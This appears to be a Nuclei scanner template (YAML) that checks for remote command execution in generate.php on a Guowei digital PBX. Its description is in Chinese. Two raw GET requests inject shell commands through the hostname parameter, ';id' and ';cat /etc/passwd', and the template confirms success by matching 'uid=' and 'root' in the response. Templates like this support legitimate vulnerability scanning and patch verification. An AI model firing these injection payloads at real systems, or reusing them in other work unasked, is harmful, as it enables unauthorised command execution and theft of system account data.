id: poc-yaml-gw-dpcte-generate-php-rce
info:
  name: "国威数字程控交换机 generate.php 远程代码执行漏洞"
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
  description: |
    国威数字程控交换机 generate.php 远程代码执行漏洞允许攻击者通过特定的输入执行远程命令。

http:
  - raw:
      - |
        GET /modules/ping/generate.php?send=Ping&hostname=;id HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "uid="
          - "gid="
          - "<"
        part: body

  - raw:
      - |
        GET /modules/ping/generate.php?send=Ping&hostname=;cat%20/etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "root"
          - "/bin"
          - "<"
        part: body
